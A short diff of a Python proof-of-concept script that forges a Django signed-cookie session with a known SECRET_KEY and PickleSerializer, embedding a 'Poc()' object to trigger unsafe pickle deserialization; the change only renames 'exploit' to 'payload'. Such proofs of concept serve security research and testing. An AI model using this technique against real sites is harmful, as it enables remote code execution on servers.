@@ -36,8 +36,8 @@ except BadSignature:
 # Instance of generated poc
 new_content['testcookie'] = Poc()
 
-# Generate the exploit
-exploit = dumps(new_content, key=SECRET_KEY, serializer=serializers.PickleSerializer,
+# Generate payload
+payload = dumps(new_content, key=SECRET_KEY, serializer=serializers.PickleSerializer,
                 salt='django.contrib.sessions.backends.signed_cookies', compress=True)
 
-print(f"Exploit -> {exploit}")
+print(f"Payload -> {payload}")
